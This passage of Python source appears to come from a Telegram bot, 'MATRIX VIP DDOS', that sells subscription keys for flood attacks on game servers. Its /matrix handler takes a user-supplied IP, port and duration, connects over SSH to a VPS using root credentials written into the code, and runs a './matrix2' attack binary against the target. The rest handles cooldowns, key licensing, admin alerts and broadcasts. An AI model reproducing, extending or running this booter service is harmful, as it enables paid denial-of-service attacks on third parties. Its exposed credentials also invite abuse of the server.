━━━━━━━━━━━━━━━
👤 𝗨𝘀𝗲𝗿: @{message.from_user.username}
🆔 𝗜𝗗: {user_id}

💎 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻:
• Status: {sub_status}
• Expires: {expiry}

🖥️ 𝗦𝗲𝗿𝘃𝗲𝗿 𝗦𝘁𝗮𝘁𝘂𝘀:
• Status: {server_status}
• {wait_msg}

⏳ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗦𝘁𝗮𝘁𝘂𝘀:
• Status: {cooldown_status}
• Duration: 5 minutes per attack

⏰ 𝗟𝗮𝘀𝘁 𝗨𝗽𝗱𝗮𝘁𝗲𝗱:
• {datetime.now(IST).strftime('%Y-%m-%d %H:%M:%S')} IST
━━━━━━━━━━━━━━━"""

        bot.reply_to(message, status_message)
    except Exception as e:
        error_message = f"❌ Failed to check status: {str(e)}"
        bot.reply_to(message, error_message)



# Add at the top of the file with other imports
import random
from collections import deque
# Modified VPS configuration with tracking
vps_list = [
    {
        "host": "139.59.224.126",
        "username": "root",
        "password": "123Buyer",
        "active_attacks": 0,
        "max_attacks": 1,
        "ongoing_attacks": [],
        "attack_start_time": None,
        "attack_duration": 0
    }

]

def get_available_vps():
    # First try to find a VPS with available slots
    for vps in vps_list:
        if vps["active_attacks"] < vps["max_attacks"]:
            return vps
            
    # If no VPS is immediately available, find the one that will free up soonest
    earliest_completion = float('inf')
    next_vps = None
    current_time = datetime.now(IST)
    
    for vps in vps_list:
        if vps["ongoing_attacks"]:
            # Get the earliest completion time among ongoing attacks
            earliest_attack_end = min(attack["end_time"] for attack in vps["ongoing_attacks"])
            time_until_free = (earliest_attack_end - current_time).total_seconds()
            
            if time_until_free < earliest_completion:
                earliest_completion = time_until_free
                next_vps = vps
    
    return None, int(earliest_completion)


def execute_attack_on_vps(vps, target, port, time):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    start_time = datetime.now(IST)
    
    try:
        # Update VPS tracking
        current_time = datetime.now(IST)
        vps["active_attacks"] += 1
        attack_info = {
            "target": target,
            "start_time": current_time,
            "end_time": current_time + timedelta(seconds=time)
        }
        vps["ongoing_attacks"].append(attack_info)

        # Connect and execute attack
        ssh.connect(
            hostname=vps['host'],
            username=vps['username'], 
            password=vps['password'],
            look_for_keys=False,
            allow_agent=False,
            timeout=30,
            auth_timeout=20
        )

        command = f"./matrix2 {target} {port} {time} 8 800"
        channel = ssh.get_transport().open_session()
        channel.exec_command(command)
        
        # Wait for completion
        exit_status = channel.recv_exit_status()
        
        if exit_status != 0:
            error_output = channel.recv_stderr(1024).decode()
            raise Exception(f"Attack command failed: {error_output}")

        end_time = datetime.now(IST)
        return f"""✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬
🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}
🔌 𝗣𝗼𝗿𝘁: {port}
⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {time} seconds
📊 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝘁𝘀:
• 𝗦𝘁𝗮𝗿𝘁𝗲𝗱: {start_time.strftime('%H:%M:%S')} IST
• 𝗘𝗻𝗱𝗲𝗱: {end_time.strftime('%H:%M:%S')} IST
⚡️ 𝗦𝘁𝗮𝘁𝘂𝘀: Attack Completed Successfully"""

    except Exception as e:
        raise Exception(f"Attack failed: {str(e)}")
    finally:
        # Cleanup
        vps["active_attacks"] -= 1
        vps["ongoing_attacks"] = [
            attack for attack in vps["ongoing_attacks"]
            if attack["end_time"] > datetime.now(IST)
        ]
        ssh.close()

user_cooldowns = {}
IST = pytz.timezone('Asia/Kolkata')

user_cooldowns = {}
# Add this function before the matrix handler
def check_cooldown(user_id):
    if user_id in user_cooldowns:
        last_attack_time = user_cooldowns[user_id]
        current_time = datetime.now(IST)
        time_diff = (current_time - last_attack_time).total_seconds()
        if time_diff < 300:  # 300 seconds = 5 minutes
            remaining_time = int(300 - time_diff)
            return False, remaining_time
    return True, 0

# Modified matrix handler with cooldown implementation
import time
from datetime import datetime, timedelta

# Add this function to create an animated progress bar with 1% accuracy
def send_animated_progress(bot, message, vps, target, port, attack_duration, end_time):
    user_id = str(message.chat.id)
    start_time = datetime.now(IST)
    
    # Define the animation frames
    animation_frames = ["▁", "▂", "▃", "▄", "▅", "▆", "▇", "█"]
    frame_index = 0
    
    # Define the progress bar length
    progress_bar_length = 20  # Number of characters in the progress bar
    
    while datetime.now(IST) < end_time:
        remaining_time = (end_time - datetime.now(IST)).total_seconds()
        progress_percentage = ((attack_duration - remaining_time) / attack_duration) * 100
        
        # Ensure progress_percentage is between 0 and 100
        progress_percentage = max(0, min(100, progress_percentage))
        
        # Calculate the filled length of the progress bar
        filled_length = int(progress_bar_length * (progress_percentage / 100))
        
        # Create the animated progress bar
        progress_bar = "█" * filled_length + animation_frames[frame_index] + " " * (progress_bar_length - filled_length)
        
        # Update the animation frame
        frame_index = (frame_index + 1) % len(animation_frames)
        
        # Build the progress message
        progress_message = f"""🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗣𝗥𝗢𝗚𝗥𝗘𝗦𝗦
🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}
🔌 𝗣𝗼𝗿𝘁: {port}
⏱️ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝗧𝗶𝗺𝗲: {int(remaining_time)} seconds
📊 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀: [{progress_bar}] {progress_percentage:.1f}%"""

        try:
            bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id, text=progress_message)
        except Exception as e:
            logging.error(f"Failed to update progress: {e}")
        
        time.sleep(1)  # Update every 1 second for smoother animation

# Modify the /matrix command handler to include animated progress updates
@bot.message_handler(commands=['matrix'])
def handle_matrix(message):
    user_id = str(message.chat.id)
    users = read_users()
    
    if user_id not in admin_owner and user_id not in users:
        bot.reply_to(message, """⛔️ 𝗨𝗻𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀
🛒 𝗧𝗼 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗮𝗻 𝗮𝗰𝗰𝗲𝘀𝘀 𝗸𝗲𝘆:
• 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗻𝘆 𝗮𝗱𝗺𝗶𝗻 𝗼𝗿 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿
📢 𝗖𝗛𝗔𝗡𝗡𝗘𝗟: ➡️ @MATRIX_CHEATS""")
        return

    if user_id not in admin_owner:
        can_attack, remaining_time = check_cooldown(user_id)
        if not can_attack:
            bot.reply_to(message, f"""⏳ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗔𝗰𝘁𝗶𝘃𝗲
• 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 {remaining_time} 𝗦𝗲𝗰𝗼𝗻𝗱𝘀
• 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻: 𝟱 𝗺𝗶𝗻𝘂𝘁𝗲𝘀 𝗽𝗲𝗿 𝗮𝘁𝘁𝗮𝗰𝗸""")
            return  

    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, """
🎮𝗔𝗥𝗘 𝗬𝗢𝗨 𝗥𝗘𝗔𝗗𝗬 𝗧𝗢 𝗙𝗨𝗖𝗞 𝗕𝗚𝗠𝗜🎯

🔥 𝗠𝗔𝗧𝗥𝗜𝗫 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦 📈

📝 𝗨𝘀𝗮𝗴𝗲: /matrix <ip> <port> <time>
𝗘𝘅𝗮𝗺𝗽𝗹𝗲: /matrix 1.1.1.1 80 180

⚠️ 𝗟𝗶𝗺𝗶𝘁𝗮𝘁𝗶𝗼𝗻𝘀:
• 𝗠𝗮𝘅 𝘁𝗶𝗺𝗲: 180 𝘀𝗲𝗰𝗼𝗻𝗱𝘀
• 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻: 5 𝗺𝗶𝗻𝘂𝘁𝗲𝘀""")
        return

    try:
        target = args[1]
        port = int(args[2])
        time_attack = int(args[3])
        current_time = datetime.now(IST)

        if time_attack > 180:
            bot.reply_to(message, "⚠️ Maximum attack time is 180 seconds.")
            return

        vps = get_available_vps()
        if isinstance(vps, tuple):
            _, wait_time = vps
            minutes = wait_time // 60
            seconds = wait_time % 60
            bot.reply_to(message, f"""
⚠️ 𝗦𝗘𝗥𝗩𝗘𝗥 𝗦𝗧𝗔𝗧𝗨𝗦

🔴 𝗔𝗹𝗹 𝗦𝗲𝗿𝘃𝗲𝗿𝘀 𝗔𝗿𝗲 𝗕𝘂𝘀𝘆
⏳ 𝗡𝗲𝘅𝘁 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗶𝗻: {minutes}m {seconds}s

📊 𝗖𝗵𝗲𝗰𝗸 𝗦𝘁𝗮𝘁𝘂𝘀: /check
💡 𝗧𝗿𝘆 𝗔𝗴𝗮𝗶𝗻 𝗟𝗮𝘁𝗲𝗿""")
            return

        # Enforce cooldown immediately after attack is initiated
        if user_id not in admin_owner:
            user_cooldowns[user_id] = datetime.now(IST)

        admin_notification = f"""
🚨 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡

👤 𝗨𝘀𝗲𝗿: @{message.from_user.username}
🆔 𝗨𝘀𝗲𝗿 𝗜𝗗: {user_id}
🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}
🔌 𝗣𝗼𝗿𝘁: {port}
⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {time_attack} seconds
💻 𝗩𝗣𝗦: {vps['host']}

⏰ 𝗧𝗶𝗺𝗲𝘀𝘁𝗮𝗺𝗽: {datetime.now(IST).strftime('%Y-%m-%d %H:%M:%S')} IST
"""
        # Send notification to all admins
        for admin in admin_id:
            bot.send_message(admin, admin_notification)

        # Send initial launch message
        launch_msg = bot.reply_to(message, f"""🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗
🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}
🔌 𝗣𝗼𝗿𝘁: {port}
⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {time_attack} seconds
⚡️ 𝗦𝘁𝗮𝘁𝘂𝘀: Attack in progress...""")

        # Calculate the end time of the attack
        end_time = datetime.now(IST) + timedelta(seconds=time_attack)

        # Start a thread to send animated progress updates
        progress_thread = threading.Thread(target=send_animated_progress, args=(bot, launch_msg, vps, target, port, time_attack, end_time))
        progress_thread.daemon = True
        progress_thread.start()

        def attack_callback():
            try:
                result = execute_attack_on_vps(vps, target, port, time_attack)
                bot.reply_to(message, result)
                
                completion_time = datetime.now(IST)
                completion_notification = f"""✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗
👤 𝗨𝘀𝗲𝗿: @{message.from_user.username}
🆔 𝗨𝘀𝗲𝗿 𝗜𝗗: {user_id}
🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}
🔌 𝗣𝗼𝗿𝘁: {port}
⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {time_attack} seconds
💻 𝗩𝗣𝗦: {vps['host']}
📊 𝗩𝗣𝗦 𝗟𝗼𝗮𝗱: {vps['active_attacks']}/{vps['max_attacks']}
⏰ 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱: {completion_time.strftime('%Y-%m-%d %H:%M:%S')} IST"""

                for admin in admin_id:
                    bot.send_message(admin, completion_notification)
                    
            except Exception as e:
                error_msg = f"❌ Attack Error: {str(e)}"
                bot.reply_to(message, error_msg)
   
                error_notification = f"""❌ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗙𝗔𝗜𝗟𝗘𝗗
👤 𝗨𝘀𝗲𝗿: @{message.from_user.username}
🆔 𝗨𝘀𝗲𝗿 𝗜𝗗: {user_id}
🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}
💻 𝗩𝗣𝗦: {vps['host']}
⚠️ 𝗘𝗿𝗿𝗼𝗿: {str(e)}
⏰ 𝗧𝗶𝗺𝗲: {datetime.now(IST).strftime('%Y-%m-%d %H:%M:%S')} IST"""

                for admin in admin_id:
                    bot.send_message(admin, error_notification)

        # Execute attack in a single thread
        attack_thread = threading.Thread(target=attack_callback)
        attack_thread.daemon = True
        attack_thread.start()

    except Exception as e:
        error_msg = f"❌ Error: {str(e)}"
        bot.reply_to(message, error_msg)

# Add at the top with other global variables
ongoing_attacks = []

@bot.message_handler(commands=['status'])
def check_status(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔️ Access Denied: Admin only command")
        return

    try:
        # Count attacks per VPS 
        vps_stats = {}
        for vps in vps_list:
            vps_stats[vps['host']] = {
                'active': vps['active_attacks'],
                'max': vps['max_attacks']
            }

        # Build status message
        status = f"""📊 𝗦𝘆𝘀𝘁𝗲𝗺 𝗦𝘁𝗮𝘁𝘂𝘀 
━━━━━━━━━━━━━━━
💻 𝗩𝗣𝗦 𝗦𝘁𝗮𝘁𝘂𝘀:"""

        total_active = 0
        for host, stats in vps_stats.items():
            load_percentage = 0 if stats['max'] == 0 else (stats['active']/stats['max'])*100
            total_active += stats['active']
            status += f"""
• {host}:
⚡️ Active Attacks: {stats['active']}/{stats['max']}
📊 Load: {load_percentage:.1f}%"""

        status += f"""
━━━━━━━━━━━━━━━
📈 𝗧𝗼𝘁𝗮𝗹 𝗔𝗰𝘁𝗶𝘃𝗲 𝗔𝘁𝘁𝗮𝗰𝗸𝘀: {total_active}
⏰ 𝗟𝗮𝘀𝘁 𝗨𝗽𝗱𝗮𝘁𝗲𝗱: {datetime.now(IST).strftime('%Y-%m-%d %H:%M:%S')} IST"""

        bot.reply_to(message, status)

    except Exception as e:
        error_msg = f"❌ Error checking status: {str(e)}"
        bot.reply_to(message, error_msg)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: Admin only command")
        return

    args = message.text.split(maxsplit=1)
    if len(args) != 2:
        bot.reply_to(message, "📝 𝗨𝘀𝗮𝗴𝗲: /broadcast <message>")
        return

    broadcast_text = args[1]
    try:
        # Get all active users
        cursor.execute("""
            SELECT user_id, username 
            FROM users 
            WHERE expiration > NOW()
            ORDER BY username
        """)
        users = cursor.fetchall()

        if not users:
            bot.reply_to(message, "❌ No active users found to broadcast to.")
            return

        # Track successful and failed broadcasts
        success_count = 0
        failed_users = []

        # Send message to each user
        for user_id, username in users:
            try:
                formatted_message = f"""
📢 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗠𝗘𝗦𝗦𝗔𝗚𝗘

{broadcast_text}

━━━━━━━━━━━━━━━
𝗦𝗲𝗻𝘁 𝗯𝘆: @{message.from_user.username}
𝗧𝗶𝗺𝗲: {datetime.now(IST).strftime('%Y-%m-%d %H:%M:%S')} IST
"""
                bot.send_message(user_id, formatted_message)
                success_count += 1
                time.sleep(0.1)  # Prevent flooding
            except Exception as e:
                failed_users.append(f"@{username}")
                logging.error(f"Failed to send broadcast to {username} ({user_id}): {e}")

        # Send summary to admin
        summary = f"""
✅ 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝗦𝘂𝗺𝗺𝗮𝗿𝘆:

📨 𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿𝘀: {len(users)}
✅ 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹: {success_count}
❌ 𝗙𝗮𝗶𝗹𝗲𝗱: {len(failed_users)}
"""
        if failed_users:
            summary += f"\n❌ 𝗙𝗮𝗶𝗹𝗲𝗱 𝘂𝘀𝗲𝗿𝘀:\n" + "\n".join(failed_users)

        bot.reply_to(message, summary)

    except Exception as e:
        logging.error(f"Broadcast error: {e}")
        bot.reply_to(message, f"❌ Error during broadcast: {str(e)}")


@bot.message_handler(commands=['start'])
def welcome_start(message):
    try:
        user_id = str(message.chat.id)
        users = read_users()
        
        welcome_text = f"""
⚡️𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗠𝗔𝗧𝗥𝗜𝗫 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦⚡️
━━━━━━━━━━━━━━━━━━━━━━━━━━
👋 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 @{message.from_user.username}!
🆔 𝗬𝗼𝘂𝗿 𝗜𝗗: `{user_id}`

🎮 𝗕𝗮𝘀𝗶𝗰 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:
• /matrix - 𝗟𝗮𝘂𝗻𝗰𝗵 𝗔𝘁𝘁𝗮𝗰𝗸
• /redeem - 𝗔𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗟𝗶𝗰𝗲𝗻𝘀𝗲
• /check - 𝗠𝗮𝘁𝗿𝗶𝘅 𝗦𝘆𝘀𝘁𝗲𝗺 𝗦𝘁𝗮𝘁𝘂𝘀

💎 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗦𝘁𝗮𝘁𝘂𝘀: {"𝗔𝗰𝘁𝗶𝘃𝗲 ✅" if user_id in users or user_id in admin_id else '''𝗜𝗻𝗮𝗰𝘁𝗶𝘃𝗲 ❌
💡 𝗡𝗲𝗲𝗱 𝗮 𝗸𝗲𝘆?
𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘂𝗿 𝗔𝗱𝗺𝗶𝗻𝘀 𝗢𝗿 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀'''}
{f"⏰ 𝗘𝘅𝗽𝗶𝗿𝗲𝘀: {users[user_id].astimezone(IST).strftime('%Y-%m-%d %H:%M:%S')} IST" if user_id in users else ""}

📢 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: @MATRIX_CHEATS
━━━━━━━━━━━━━━━━━━━━━━━━━━"""

        if user_id in admin_id:
            welcome_text += """

👑 𝗔𝗗𝗠𝗜𝗡 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦:
• /key <duration> - 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲 𝗮 𝗻𝗲𝘄 𝗹𝗶𝗰𝗲𝗻𝘀𝗲 𝗸𝗲𝘆
• /allkeys - 𝗩𝗶𝗲𝘄 𝗮𝗹𝗹 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗸𝗲𝘆𝘀
• /allusers - 𝗩𝗶𝗲𝘄 𝗮𝗹𝗹 𝗮𝗰𝘁𝗶𝘃𝗲 𝘂𝘀𝗲𝗿𝘀
• /broadcast <message> - 𝗦𝗲𝗻𝗱 𝗮 𝗯𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝘁𝗼 𝗮𝗹𝗹 𝘂𝘀𝗲𝗿𝘀
• /remove <key> - 𝗥𝗲𝗺𝗼𝘃𝗲 𝗮 𝗸𝗲𝘆 𝗳𝗿𝗼𝗺 𝘁𝗵𝗲 𝘀𝘆𝘀𝘁𝗲𝗺
• /status - 𝗖𝗵𝗲𝗰𝗸 𝘀𝘆𝘀𝘁𝗲𝗺 𝘀𝘁𝗮𝘁𝘂𝘀 𝗮𝗻𝗱 𝗩𝗣𝗦 𝗹𝗼𝗮𝗱
• /addtime <key> <duration> - 𝗔𝗱𝗱 𝘁𝗶𝗺𝗲 𝘁𝗼 𝗮 𝘂𝘀𝗲𝗿'𝘀 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻

⚡️ 𝗔𝗱𝗺𝗶𝗻 𝗣𝗮𝗻𝗲𝗹 𝗔𝗰𝘁𝗶𝘃𝗲 ⚡️"""

        bot.reply_to(message, welcome_text)
            
    except Exception as e:
        error_text = """
❌ 𝗘𝗥𝗥𝗢𝗥
An unexpected error occurred. Please try again later."""
        logging.error(f"Error in /start command: {e}")
        bot.reply_to(message, error_text)


# Handler for broadcasting a message
@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_owner:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
            users = read_users()  # Get users from Redis
            if users:
                for user in users:
                    try:
                        bot.send_message(user, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user}: {str(e)}")
                response = "Broadcast Message Sent Successfully To All Users."
            else:
                response = "No users found in the system."
        else:
            response = "Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)

import threading

def cleanup_task():
    while True:
        clean_expired_users()
        time.sleep(60)  # Check every minute

def run_bot():
    create_indexes()
    # Start the cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_task, daemon=True)
    cleanup_thread.start()
    
    while True:
        try:
            print("Bot is running...")
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except (ReadTimeout, RequestException) as e:
            logging.error(f"Connection error: {e}")
            time.sleep(15)
        except Exception as e:
            logging.error(f"Bot error: {e}")
            time.sleep(15)


if __name__ == "__main__":
    run_bot()
